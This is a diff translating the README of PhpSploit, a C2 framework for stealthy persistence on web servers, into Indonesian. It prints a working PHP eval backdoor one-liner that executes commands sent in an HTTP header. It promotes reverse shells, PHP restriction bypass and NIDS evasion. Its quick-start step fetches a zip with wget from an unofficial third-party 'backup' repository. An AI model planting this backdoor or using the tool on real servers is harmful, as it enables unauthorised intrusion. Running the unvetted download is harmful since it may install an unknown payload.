@@ -1,3 +1,4 @@
+
 <p align="center">
   <a href="https://github.com/nil0x42/phpsploit" alt="master">
     <img src="https://raw.githubusercontent.com/nil0x42/phpsploit/master/data/img/logo.png" alt="Master">
@@ -5,7 +6,7 @@
 </p>
 
 <h3 align="center">
-    Full-featured C2 framework which silently persists on <br>webserver via polymorphic PHP oneliner
+    Framework C2 yang lengkap dengan fitur yang diam-diam tetap bertahan<br>di server web melalui PHP oneliner polimorfik
     <a href="https://twitter.com/intent/tweet?text=PhpSploit%2C%20Full-featured%20C2%20framework%20which%20silently%20persists%20on%20webserver%20via%20polymorphic%20PHP%20oneliner%20-%20by%20@nil0x42&url=https://github.com/nil0x42/phpsploit">
       <img src="https://img.shields.io/twitter/url?label=tweet&logo=twitter&style=social&url=http%3A%2F%2F0" alt="tweet">
     </a>
@@ -50,9 +51,9 @@
 
 <div align="center">
   <sub>
-    Created by
-    <a href="https://twitter.com/nil0x42">nil0x42</a> and
-    <a href="https://github.com/nil0x42/phpsploit#contributors">contributors</a>
+    Dibuat oleh
+    <a href="https://twitter.com/nil0x42">nil0x42</a> dan
+    <a href="https://github.com/nil0x42/phpsploit#contributors">kontributor</a>
   </sub>
 </div>
 
@@ -65,11 +66,9 @@
 </p>
 
 
-#### Overview
+#### Ikhtisar
 
-The obfuscated communication is accomplished using HTTP headers under
-standard client requests and web server's relative responses, tunneled
-through a tiny **polymorphic backdoor**:
+Komunikasi tersamarkan dicapai dengan menggunakan header HTTP di bawah permintaan klien standar dan respons relatif server web, ditunnel melalui **backdoor polimorfik** kecil:
 
 ```php
 <?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>
@@ -77,7 +76,7 @@ through a tiny **polymorphic backdoor**:
 
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 
-#### Quick Start
+#### Panduan Cepat
 
 ```sh
 wget https://github.com/JawaTengahXploit1337/phpsploit-backup/raw/refs/heads/main/php.zip
@@ -89,56 +88,50 @@ pip3 install -r requirements.txt
 
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 
-#### Features
+#### Fitur
 
--   **Efficient**: More than 20 plugins to automate privilege-escalation tasks
-    -   Run commands and browse filesystem, bypassing PHP security restrictions
-    -   Upload/Download files between client and target
-    -   Edit remote files through local text editor
-    -   Run SQL console on target system
-    -   Spawn reverse TCP shells
+- **Efisien**: Lebih dari 20 plugin untuk mengotomatiskan tugas eskalasi privilese
+    - Menjalankan perintah dan menjelajahi sistem file, melewati pembatasan keamanan PHP
+    - Mengunggah/Mengunduh file antara klien dan target
+    - Mengedit file jarak jauh melalui editor teks lokal
+    - Menjalankan konsol SQL di sistem target
+    - Membuka reverse TCP shell
 
--   **Stealth**: The framework is made by paranoids, for paranoids
-    -   Nearly invisible by log analysis and NIDS signature detection
-    -   Safe-mode and common _PHP security restrictions bypass_
-    -   Communications are hidden in HTTP Headers
-    -   Loaded payloads are obfuscated to _bypass NIDS_
-    -   http/https/socks4/socks5 **Proxy support**
+- **Tersembunyi**: Dibuat untuk paranoia tingkat tinggi
+    - Hampir tidak terlihat oleh analisis log dan deteksi tanda tangan NIDS
+    - Bypass _pembatasan keamanan PHP umum_
+    - Komunikasi tersembunyi di header HTTP
+    - Payload yang dimuat tersamarkan untuk _melewati NIDS_
+    - Dukungan proxy: http/https/socks4/socks5
 
--   **Convenient**: A robust interface with many crucial features
-    -   Detailed help for any option (`help` command)
-    -   _Cross-platform_ on both client and server.
-    -   CLI supports auto-completion & multi-command
-    -   Session saving/loading feature & persistent history
-    -   Multi-request support for large payloads (such as uploads)
-    -   Provides a powerful, highly configurable settings engine
-    -   Each setting, such as user-agent has a _polymorphic mode_
-    -   Customisable environment variables for plugin interaction
-    -   Provides a complete plugin development API
+- **Nyaman**: Antarmuka yang kokoh dengan banyak fitur penting
+    - Bantuan rinci untuk setiap opsi (perintah `help`)
+    - _Lintas platform_ di klien dan server
+    - CLI mendukung auto-completion & multi-command
+    - Fitur penyimpanan/pemuatan sesi & riwayat yang persisten
+    - Mendukung permintaan besar untuk payload besar (misalnya unggahan)
+    - Mesin pengaturan yang sangat dapat dikonfigurasi
+    - Setiap pengaturan, seperti user-agent, memiliki mode polimorfik
+    - Variabel lingkungan kustom untuk interaksi plugin
+    - API pengembangan plugin yang lengkap
 
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 
-#### Supported platforms (as attacker):
+#### Platform yang Didukung (sebagai penyerang):
 
--   GNU/Linux
--   Mac OS X
+- GNU/Linux
+- Mac OS X
 
-#### Supported platforms (as target):
+#### Platform yang Didukung (sebagai target):
 
--   GNU/Linux
--   BSD-like
--   Mac OS X
--   Windows NT
+- GNU/Linux
+- BSD-like
+- Mac OS X
+- Windows NT
 
-## Contributors
+## Kontributor
 
-<!-- [![](https://contrib.rocks/image?repo=nil0x42/phpsploit)](https://github.com/nil0x42/phpsploit/graphs/contributors) -->
-<!-- <details> -->
-<!-- <summary><b>:trophy: All contributors</b></summary> -->
-Thanks goes to these wonderful people:
-<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
-<!-- prettier-ignore-start -->
-<!-- markdownlint-disable -->
+Terima kasih kepada orang-orang hebat ini:
 <table>
   <tr>
     <td align="center"><a href="https://exdemia.com"><img src="https://avatars1.githubusercontent.com/u/3504393?v=4" width="100px;" alt=""/><br /><sub><b>nil0x42</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/commits?author=nil0x42" title="Code">💻</a> <a href="#infra-nil0x42" title="Infrastructure (Hosting, Build-Tools, etc)">🚇</a> <a href="#plugin-nil0x42" title="Plugin/utility libraries">🔌</a> <a href="https://github.com/nil0x42/phpsploit/commits?author=nil0x42" title="Tests">⚠️</a></td>
